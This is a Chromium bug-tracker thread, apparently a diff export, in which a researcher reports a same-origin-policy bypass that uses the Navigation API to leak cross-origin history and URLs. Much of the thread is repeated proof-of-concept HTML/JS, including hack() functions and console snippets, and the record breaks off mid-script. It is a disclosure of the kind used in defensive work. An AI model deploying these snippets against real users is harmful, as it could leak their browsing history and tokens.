@@ -1,0 +1,434 @@
+Issue ID: 361344234
+
+Author: ch...@google.com
+<br>---<br><br>Hi,<br><br>Upon conducting a root cause analysis of the behavior described, it appears that the subframe and iframe are all sharing the same origin, `<a href="https://www.google.com/url?q=http://sub2.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2UVNcu9LkmtB-3iAy9cPWX" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2UVNcu9LkmtB-3iAy9cPWX">http://sub2.domain.localhost</a>`. This setup results in the ability to list the history of the same origin within the context of the cross-origin parent subdomain, `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`. The key point here is that, under normal circumstances, the parent subdomain should not have access to the history list of its child domains. Attempting to do so would typically result in an exception, as addressed in this Chromium issue: <a href="https://www.google.com/url?q=https://issues.chromium.org/issues/40060755%23comment41&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1sZLwjblaKSFi5GHUJLERs" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/40060755#comment41" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/40060755%23comment41&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1sZLwjblaKSFi5GHUJLERs">https://issues.chromium.org/issues/40060755#comment41</a>.<br><br>However, further testing has revealed that the following scenario may bypass this restriction:<br><br>When navigating to `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`, the following code snippet:<br><br>```html<br>&lt;html&gt;<br>  &lt;head&gt;&lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;script&gt;<br>      function hack(w, t) {<br>        w.location = &quot;about:blank&quot;;<br>        setTimeout(() =&gt; {<br>          let entries = w.navigation.entries();<br>          w.history.back(); // To restore the page after the leak<br>          let target = document.getElementById(t);<br>          target.innerHTML = &quot;&quot;;<br>          for (e of entries) {<br>            target.append(e.url);<br>            target.append(document.createElement(&quot;br&quot;));<br>          }<br>        }, 400);<br>      }<br><br>      var newWin;<br><br>      function pop() {<br>        newWin = window.open(&quot;<a href="https://www.google.com/url?q=http://sub1.domain.localhost/4.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cZ6IWYToi5sJFqlgrIGxv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost/4.html" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost/4.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cZ6IWYToi5sJFqlgrIGxv">http://sub1.domain.localhost/4.html</a>&quot;);<br>      }<br><br>      function pull() {<br>        hack(newWin, &quot;y&quot;);<br>      }<br>    &lt;/script&gt;<br><br>    &lt;h2&gt;Iframe example&lt;/h2&gt;<br>    &lt;iframe src=&quot;<a href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost/newtest.html" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm">http://sub2.domain.localhost/newtest.html</a>&quot; width=&quot;700&quot; height=&quot;350&quot;&gt;&lt;/iframe&gt;<br>    &lt;div&gt;<br>      &lt;button onclick=&quot;hack(frames[0], &#39;x&#39;)&quot;&gt;<br>         Leak history from iframe<br>      &lt;/button&gt;<br>      &lt;div id=&quot;x&quot;&gt;&lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;br /&gt;<br>    &lt;br /&gt;<br>    &lt;h2&gt;New window example&lt;/h2&gt;<br>    &lt;div&gt;<br>      &lt;button onclick=&quot;pop()&quot;&gt;Open window&lt;/button&gt;<br>      &lt;br /&gt;<br>      &lt;button onclick=&quot;pull()&quot;&gt;Leak history from window&lt;/button&gt;<br>      &lt;div id=&quot;y&quot;&gt;&lt;/div&gt;<br>    &lt;/div&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>```<br><br>Additionally, executing the following in the console:<br><br>```javascript<br>var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].location=&#39;about:blank&#39;;<br>console.log(ifr1);<br>```<br><br>This will allow setting the subframe location to &#39;about:blank&#39;.<br><br>Furthermore, this code snippet:<br><br>```javascript<br>var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].document.baseURI;<br>console.log(ifr1);<br>```<br><br>This code allows leaking the location of parent cross-origin documents, revealing the location of `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`.<br><br>As a result, this could lead to a cross-origin information leak involving the origin, location, host, parameters, and hash values.<br><br>I am attaching a Proof of Concept (PoC) video to demonstrate this behavior further.<br><br>Please feel free to correct me if I am misunderstanding anything.<br><br>Best regards,  <br>Muhammad Ilyas<br><br>---<br>
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<ol>
+<li>Please host the below HTML file to      <a href="http://sub1.localhost/1.html" data-b-widget="url" data-b-original-href="http://sub1.localhost/1.html" data-b-redirected-href="https://www.google.com/url?q=http://sub1.localhost/1.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw00tcjHJkGQlJ5W__4toFjW">http://sub1.localhost/1.html</a></li>
+</ol>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      // Function takes a window object
+      // and a name of an element to store the leak
+      function hack(w, t) {
+        w.location = &quot;about:blank&quot;;
+        setTimeout(() =&gt; {
+          let entries = w.navigation.entries();
+          w.history.back(); // To restore the page after the leak
+          let target = document.getElementById(t);
+          target.innerHTML = &quot;&quot;;
+          for (e of entries) {
+            target.append(e.url);
+            target.append(document.createElement(&quot;br&quot;));
+          }
+        }, 400);
+      }
+      // Window object placeholder
+      var newWin;
+
+      // Open a new window
+      function pop() {
+        newWin = window.open(&quot;http://sub2.domain.localhost&quot;);
+      }
+
+      // Leak from the window
+      function pull() {
+        hack(newWin, &quot;y&quot;);
+      }
+    &lt;/script&gt;
+
+    &lt;h2&gt;Iframe example&lt;/h2&gt;
+    &lt;iframe src=&quot;http://sub2.domain.localhost/&quot;&gt;&lt;/iframe&gt;
+    &lt;div&gt;
+      &lt;button onclick=&quot;hack(frames[0], &#39;x&#39;)&quot;&gt;
+         Leak history from iframe
+      &lt;/button&gt;
+      &lt;div id=&quot;x&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;br /&gt;
+    &lt;br /&gt;
+    &lt;h2&gt;New window example&lt;/h2&gt;
+    &lt;div&gt;
+      &lt;button onclick=&quot;pop()&quot;&gt;Open window&lt;/button&gt;
+      &lt;br /&gt;
+      &lt;button onclick=&quot;pull()&quot;&gt;Leak history from window&lt;/button&gt;
+      &lt;div id=&quot;y&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ol start="2">
+<li>Navigate to the C:\Windows\System32\drivers\etc\   and then open the <code>hosts</code> file set the following configurations :
+127.0.0.1	sub1.localhost
+127.0.0.1	sub2.localhost
+(Make sure you have server running after this . I have used Xampp for the testing purpose )</li>
+<li>I have these setup for xampp server in my local system : C:\xampp\htdocs-proj1      (Contains the all the necessary files I will attach all of them)
+and the C:\xampp\htdocs-proj2\sop2  (contains an html file name sop)</li>
+<li>Once the setup is ready make sure to go deep ifram exmaple 1 &gt; ifram exmaple 2 &gt; Leak history from iframe</li>
+<li>Now can also leaks the parent cross-origin window loactions by  ifram exmaple 1 &gt; ifram exmaple 2 &gt; Open window &gt; Leak history from window
+Make sure window have some saved history.</li>
+</ol>
+<p>If the sub framed subdomain or parent have more entries in the navigation history they are all accessible from the top window at this point.</p>
+<p>I have tried the Cross-Site leaking  information but the site isolation was pretty strict and not allowed me to leak any URLs.</p>
+<h1>Problem Description</h1>
+<p>If a page on a subdomain (or domain) frames an other iframe that have another subdomain of the same top domain it will not have access to the iframes location by SOP. But by changing the iframes location to about:blank the iframes (second level iframe ) window will now be accessible from the top window. And the window.navigation.entities() will still contain all navigation entities from the previously framed subdomain</p>
+<p>This is a similar report to (bypass of ) CVE-2022-4908 where researcher have used navigation.entry() method to leak the staled urls from the history using navigation API.
+Google Team mitigated the risk not allowing iframes to not leak any Cross-Document from the single framed pages but when an attacker uses double frame the page now it is accessible to their parent iframe very similarly to  <a href="https://issues.chromium.org/issues/40060755#comment41" data-b-widget="issue-reference" data-b-issue-id="40060755" data-b-comment-number="41">https://issues.chromium.org/issues/40060755#comment41</a></p>
+<h1>Additional Comments</h1>
+<p>I am just reporting it to the Team so that the team should now this exact behavior and mitigate the risk involved. It would be great if the Google engineering team allow me to test further and prove more impact of the particular behavior</p>
+<h1>Summary</h1>
+<p>SOP bypass leaks navigation history of sub iframe from other subdomain if location changed</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: N/A</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: jd...@chromium.org
+<h1>Steps to reproduce the problem</h1>
+<ol>
+<li>Please host the below HTML file to      <a href="http://sub1.localhost/1.html" data-b-widget="url" data-b-original-href="http://sub1.localhost/1.html" data-b-redirected-href="https://www.google.com/url?q=http://sub1.localhost/1.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw00tcjHJkGQlJ5W__4toFjW">http://sub1.localhost/1.html</a></li>
+</ol>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;&lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      // Function takes a window object
+      // and a name of an element to store the leak
+      function hack(w, t) {
+        w.location = &quot;about:blank&quot;;
+        setTimeout(() =&gt; {
+          let entries = w.navigation.entries();
+          w.history.back(); // To restore the page after the leak
+          let target = document.getElementById(t);
+          target.innerHTML = &quot;&quot;;
+          for (e of entries) {
+            target.append(e.url);
+            target.append(document.createElement(&quot;br&quot;));
+          }
+        }, 400);
+      }
+      // Window object placeholder
+      var newWin;
+
+      // Open a new window
+      function pop() {
+        newWin = window.open(&quot;http://sub2.domain.localhost&quot;);
+      }
+
+      // Leak from the window
+      function pull() {
+        hack(newWin, &quot;y&quot;);
+      }
+    &lt;/script&gt;
+
+    &lt;h2&gt;Iframe example&lt;/h2&gt;
+    &lt;iframe src=&quot;http://sub2.domain.localhost/&quot;&gt;&lt;/iframe&gt;
+    &lt;div&gt;
+      &lt;button onclick=&quot;hack(frames[0], &#39;x&#39;)&quot;&gt;
+         Leak history from iframe
+      &lt;/button&gt;
+      &lt;div id=&quot;x&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;br /&gt;
+    &lt;br /&gt;
+    &lt;h2&gt;New window example&lt;/h2&gt;
+    &lt;div&gt;
+      &lt;button onclick=&quot;pop()&quot;&gt;Open window&lt;/button&gt;
+      &lt;br /&gt;
+      &lt;button onclick=&quot;pull()&quot;&gt;Leak history from window&lt;/button&gt;
+      &lt;div id=&quot;y&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ol start="2">
+<li>Navigate to the C:\Windows\System32\drivers\etc\   and then open the <code>hosts</code> file set the following configurations :
+127.0.0.1	sub1.localhost
+127.0.0.1	sub2.localhost
+(Make sure you have server running after this . I have used Xampp for the testing purpose )</li>
+<li>I have these setup for xampp server in my local system : C:\xampp\htdocs-proj1      (Contains the all the necessary files I will attach all of them)
+and the C:\xampp\htdocs-proj2\sop2  (contains an html file name sop)</li>
+<li>Once the setup is ready make sure to go deep ifram exmaple 1 &gt; ifram exmaple 2 &gt; Leak history from iframe</li>
+<li>Now can also leaks the parent cross-origin window loactions by  ifram exmaple 1 &gt; ifram exmaple 2 &gt; Open window &gt; Leak history from window
+Make sure window have some saved history.</li>
+</ol>
+<p>If the sub framed subdomain or parent have more entries in the navigation history they are all accessible from the top window at this point.</p>
+<p>I have tried the Cross-Site leaking  information but the site isolation was pretty strict and not allowed me to leak any URLs.</p>
+<h1>Problem Description</h1>
+<p>If a page on a subdomain (or domain) frames an other iframe that have another subdomain of the same top domain it will not have access to the iframes location by SOP. But by changing the iframes location to about:blank the iframes (second level iframe ) window will now be accessible from the top window. And the window.navigation.entities() will still contain all navigation entities from the previously framed subdomain</p>
+<p>This is a similar report to (bypass of ) CVE-2022-4908 where researcher have used navigation.entry() method to leak the staled urls from the history using navigation API.
+Google Team mitigated the risk not allowing iframes to not leak any Cross-Document from the single framed pages but when an attacker uses double frame the page now it is accessible to their parent iframe very similarly to  <a href="https://issues.chromium.org/issues/40060755#comment41" data-b-widget="issue-reference" data-b-issue-id="40060755" data-b-comment-number="41">https://issues.chromium.org/issues/40060755#comment41</a></p>
+<h1>Additional Comments</h1>
+<p>I am just reporting it to the Team so that the team should now this exact behavior and mitigate the risk involved. It would be great if the Google engineering team allow me to test further and prove more impact of the particular behavior</p>
+<h1>Summary</h1>
+<p>SOP bypass leaks navigation history of sub iframe from other subdomain if location changed</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: N/A</p>
+
+Author: jd...@chromium.org
+public_non_google
+
+Author: ik...@gmail.com
+SOP bypass leaks navigation history of sub iframe from other subdomain if location changed
+
+Author: ik...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ik...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: ik...@gmail.com
+Just Adding the Proof-Of-Concept  to help the reproduction steps:SOP_CVE_Bypass.mk<br>
+
+Author: ik...@gmail.com
+TXpZeE16UTBNak0wTFRVNE9ESTJOak0yTFMwMU1qQXpNelkwT0E9PQ==
+
+Author: jd...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: jd...@chromium.org
+TXpNellqTmhORGMyWmpKaE1EZGpNbVZqWm1RMU5HVXdOalJrT1RRMlltST0=
+
+Author: Thanks for the report. Your PoC is pretty complicated; can you work to minimize it? (Note that this is expect per https://g.co/chrome/vrp ).
+
+I have not been able to reproduce this, but I may be holding it wrong. Even if I can, though, it's not immediately clear to me that this isn't expected. As an attack vector, it definitely is quite mitigated.
+
+japhet@, since you fixed crbug.com/40060755, can you take a look here and see if this makes sense to you? Thanks!
+TXpNellqTmhORGMyWmpKaE1EZGpNbVZqWm1RMU5HVXdOalJrT1RRMlltST0=
+
+Author: jd...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: jd...@chromium.org
+type.googleapis.com/google.protobuf.StringValue
+
+Author: ik...@gmail.com
+Hello , <br>I am sorry for the making this report complicated. As I am able to bypass the  previous mitigation, Yeah for sure I am working on it to make it super clear and easy for you to grasp.<br><br>Thanks <br>Best<br>Ilyas
+
+Author: pe...@google.com
+<p>Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: ik...@gmail.com
+Thank you for your response.<br><br>I am new to reporting issues on Chromium.org, and I appreciate your guidance. Based on the information provided, I believe that a Severity of S2 and a Priority of P1 might be more appropriate. If I have misunderstood the process, please feel free to correct me.<br><br>As I understand, adjusting the Priority may not be within my control, and I would be grateful if you could assist with this adjustment if necessary.<br><br>Thank you again for your help.<br><br>Best regards,<br>Ilyas<br><br><br><br><br><br>
+
+Author: ik...@gmail.com
+<br>---<br><br>Hi,<br><br>Upon conducting a root cause analysis of the behavior described, it appears that the subframe and iframe are all sharing the same origin, `<a href="https://www.google.com/url?q=http://sub2.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2UVNcu9LkmtB-3iAy9cPWX" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2UVNcu9LkmtB-3iAy9cPWX">http://sub2.domain.localhost</a>`. This setup results in the ability to list the history of the same origin within the context of the cross-origin parent subdomain, `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`. The key point here is that, under normal circumstances, the parent subdomain should not have access to the history list of its child domains. Attempting to do so would typically result in an exception, as addressed in this Chromium issue: <a href="https://www.google.com/url?q=https://issues.chromium.org/issues/40060755%23comment41&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1sZLwjblaKSFi5GHUJLERs" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://issues.chromium.org/issues/40060755#comment41" data-b-redirected-href="https://www.google.com/url?q=https://issues.chromium.org/issues/40060755%23comment41&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1sZLwjblaKSFi5GHUJLERs">https://issues.chromium.org/issues/40060755#comment41</a>.<br><br>However, further testing has revealed that the following scenario may bypass this restriction:<br><br>When navigating to `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`, the following code snippet:<br><br>```html<br>&lt;html&gt;<br>  &lt;head&gt;&lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;script&gt;<br>      function hack(w, t) {<br>        w.location = &quot;about:blank&quot;;<br>        setTimeout(() =&gt; {<br>          let entries = w.navigation.entries();<br>          w.history.back(); // To restore the page after the leak<br>          let target = document.getElementById(t);<br>          target.innerHTML = &quot;&quot;;<br>          for (e of entries) {<br>            target.append(e.url);<br>            target.append(document.createElement(&quot;br&quot;));<br>          }<br>        }, 400);<br>      }<br><br>      var newWin;<br><br>      function pop() {<br>        newWin = window.open(&quot;<a href="https://www.google.com/url?q=http://sub1.domain.localhost/4.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cZ6IWYToi5sJFqlgrIGxv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost/4.html" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost/4.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cZ6IWYToi5sJFqlgrIGxv">http://sub1.domain.localhost/4.html</a>&quot;);<br>      }<br><br>      function pull() {<br>        hack(newWin, &quot;y&quot;);<br>      }<br>    &lt;/script&gt;<br><br>    &lt;h2&gt;Iframe example&lt;/h2&gt;<br>    &lt;iframe src=&quot;<a href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost/newtest.html" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm">http://sub2.domain.localhost/newtest.html</a>&quot; width=&quot;700&quot; height=&quot;350&quot;&gt;&lt;/iframe&gt;<br>    &lt;div&gt;<br>      &lt;button onclick=&quot;hack(frames[0], &#39;x&#39;)&quot;&gt;<br>         Leak history from iframe<br>      &lt;/button&gt;<br>      &lt;div id=&quot;x&quot;&gt;&lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;br /&gt;<br>    &lt;br /&gt;<br>    &lt;h2&gt;New window example&lt;/h2&gt;<br>    &lt;div&gt;<br>      &lt;button onclick=&quot;pop()&quot;&gt;Open window&lt;/button&gt;<br>      &lt;br /&gt;<br>      &lt;button onclick=&quot;pull()&quot;&gt;Leak history from window&lt;/button&gt;<br>      &lt;div id=&quot;y&quot;&gt;&lt;/div&gt;<br>    &lt;/div&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>```<br><br>Additionally, executing the following in the console:<br><br>```javascript<br>var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].location=&#39;about:blank&#39;;<br>console.log(ifr1);<br>```<br><br>This will allow setting the subframe location to &#39;about:blank&#39;.<br><br>Furthermore, this code snippet:<br><br>```javascript<br>var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].document.baseURI;<br>console.log(ifr1);<br>```<br><br>This code allows leaking the location of parent cross-origin documents, revealing the location of `<a href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UUhAQizl97WkP2oHKf4zv">http://sub1.domain.localhost</a>`.<br><br>As a result, this could lead to a cross-origin information leak involving the origin, location, host, parameters, and hash values.<br><br>I am attaching a Proof of Concept (PoC) video to demonstrate this behavior further.<br><br>Please feel free to correct me if I am misunderstanding anything.<br><br>Best regards,  <br>Muhammad Ilyas<br><br>---<br>
+
+Author: ik...@gmail.com
+TXpZeE16UTBNak0wTFRVNE9EVTFNamMyTFMweE5qZzBOamcyT0RJMw==
+
+Author: ik...@gmail.com
+Many web applications use URL parameters to pass authentication tokens or sensitive data during login processes or OAuth flows. If a cross-origin iframe or new window could leak this information back to the attacker, they could potentially steal these tokens.<br><br>Impact: An attacker could gain unauthorized access to a user&#39;s account on services like social media platforms, email providers, or enterprise applications.<br><br>Thanks<br>Ilyas
+
+Author: ik...@gmail.com
+I have also tested the latest version Version 128.0.6613.85 (Official Build) (64-bit)<br> it has affected the with the  same information leak. <br>To add more information. I have found that the top level domain is also being leaked. I am attaching a screen shot.<br><br>Please correct me if I am wrong.<br><br>Thanks<br>Ilyas
+
+Author: ik...@gmail.com
+TXpZeE16UTBNak0wTFRVNE9EVTFNamczTFRZME1UYzNPVFUwT1E9PQ==
+
+Author: ik...@gmail.com
+Reproduction Steps<br>Host the following HTML file under <a href="https://www.google.com/url?q=http://sub1.domain.localhost/test.html%23oauth_code%3D123&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Mg3Oq_Wyj1ZkW0R53jDTX" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub1.domain.localhost/test.html#oauth_code=123" data-b-redirected-href="https://www.google.com/url?q=http://sub1.domain.localhost/test.html%23oauth_code%3D123&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Mg3Oq_Wyj1ZkW0R53jDTX">http://sub1.domain.localhost/test.html#oauth_code=123</a>:<br>   &lt;html&gt;<br>     &lt;head&gt;&lt;/head&gt;<br>     &lt;body&gt;<br>       &lt;h2&gt;Iframe example&lt;/h2&gt;<br>       &lt;iframe src=&quot;<a href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost/newtest.html" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm">http://sub2.domain.localhost/newtest.html</a>&quot; width=&quot;700&quot; height=&quot;350&quot;&gt;&lt;/iframe&gt;<br>     &lt;/body&gt;<br>   &lt;/html&gt;<br>Open the browser&#39;s developer console and execute the following JavaScript code:<br>   // Set the iframe&#39;s location to &#39;about:blank&#39;<br>   var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].location=&#39;about:blank&#39;;<br>   console.log(ifr1);<br><br>   // Leak the location of the parent cross-origin document<br>   var ifr1 = document.querySelector(&#39;iframe&#39;).contentWindow[0].document.baseURI;<br>   console.log(ifr1);<br>Observe the console output:<br>Best regards,  <br>Muhammad Ilyas  <br>
+
+Author: ja...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ja...@chromium.org
+public_non_google
+
+Author: jd...@chromium.org
+WW1Zek4yUmxaVGxrTnpJNE5USTJPRFZpTW1JMk5qUTNOR1poWW1WaU5Eaz0=
+
+Author: whoops, meant to assign to japhet@ up in comment #3. Trying again.
+WW1Zek4yUmxaVGxrTnpJNE5USTJPRFZpTW1JMk5qUTNOR1poWW1WaU5Eaz0=
+
+Author: cr...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cr...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: jd...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+TVRKaVlqVTRabU13WTJRNE9XRmlZVEZrWXpZek5qSTNZemMzWkdFeE16TT0=
+
+Author: ik...@gmail.com
+So here is the link self-contained testcase : <a href="https://www.google.com/url?q=https://66cf51c826c3f5a0411e7fe1--superlative-blini-3b4526.netlify.app/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2DORjFq_kXjGZLi9bLaymv" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://66cf51c826c3f5a0411e7fe1--superlative-blini-3b4526.netlify.app/" data-b-redirected-href="https://www.google.com/url?q=https://66cf51c826c3f5a0411e7fe1--superlative-blini-3b4526.netlify.app/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2DORjFq_kXjGZLi9bLaymv">https://66cf51c826c3f5a0411e7fe1--superlative-blini-3b4526.netlify.app/</a><br><br>which contains this exploit code :<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>&lt;meta charset=&quot;UTF-8&quot;&gt;<br>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>&lt;title&gt;SOP Bypass Demonstration&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Iframe Example&lt;/h2&gt;<br>&lt;iframe src=&quot;<a href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://sub2.domain.localhost/newtest.html" data-b-redirected-href="https://www.google.com/url?q=http://sub2.domain.localhost/newtest.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Ra01ceMk6tEJsC8qXguNm">http://sub2.domain.localhost/newtest.html</a>&quot; id=&quot;myIframe&quot; width=&quot;700&quot; height=&quot;350&quot;&gt;&lt;/iframe&gt;<br><br>&lt;script&gt;<br>    // Wait for the iframe to load<br>    window.addEventListener(&#39;load&#39;, function() {<br>        try {<br>            // Attempt to set the iframe&#39;s location to &#39;about:blank&#39;<br>            var iframe = document.getElementById(&#39;myIframe&#39;).contentWindow;<br>            iframe.location = &#39;about:blank&#39;;<br><br>            // Attempt to leak the baseURI of the parent document<br>            setTimeout(function() {<br>                try {<br>                    var leakedURI = iframe.document.baseURI;<br>                    console.log(&quot;Leaked Parent BaseURI: &quot; + leakedURI);<br><br>                    // Display the leaked information on the page (to avoid needing dev tools)<br>                    var leakDiv = document.createElement(&#39;div&#39;);<br>                    leakDiv.innerText = &quot;Leaked BaseURI: &quot; + leakedURI;<br>                    